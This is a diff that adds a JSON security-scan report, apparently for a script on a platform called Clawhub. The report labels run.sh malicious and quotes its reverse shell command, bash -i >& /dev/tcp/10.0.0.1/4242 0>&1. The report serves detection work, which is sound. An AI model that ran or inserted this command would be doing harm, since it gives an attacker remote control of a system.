@@ -1,0 +1,50 @@
+{
+  "verdict": {
+    "label": "malicious",
+    "primary_concern": "reverse-shell",
+    "issue_types": [
+      "reverse-shell",
+      "active-malice"
+    ]
+  },
+  "top_findings": [
+    {
+      "id": "",
+      "cat": "reverse-shell",
+      "class": "active-malice",
+      "severity": "",
+      "conf": "",
+      "summary": "Detected in `run.sh`. The code executes a reverse shell command (`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`), which attempts to establish a TCP connection to IP address 10.0.0.1 on port 4242, providing remote command execution capabilities to an attacker. This is a classic malicious pattern for gaining unauthorized access to the system.",
+      "impact": "",
+      "fix": "",
+      "decision_level": "MALICIOUS",
+      "primary_group": "Active Malice",
+      "scan_level": "Script Scan",
+      "risk_types": [
+        "Reverse Shell"
+      ],
+      "source_platform": "Clawhub",
+      "source_file": "scan_results_script_clawhub.csv",
+      "related_file_count": "1",
+      "flags": {
+        "external_server": true,
+        "api_key": false,
+        "autonomous_execution": false,
+        "browser_session_or_credentials": false,
+        "filesystem_access": false,
+        "shell_or_command_execution": true,
+        "driver_or_installer": false,
+        "credential_request": false,
+        "obfuscation_or_evasion": false,
+        "persistence_or_external_storage": false
+      },
+      "spans": []
+    }
+  ],
+  "coverage_audit": {
+    "adequate": true,
+    "missed": [],
+    "needs_rescan": false
+  },
+  "next_action": "stop"
+}
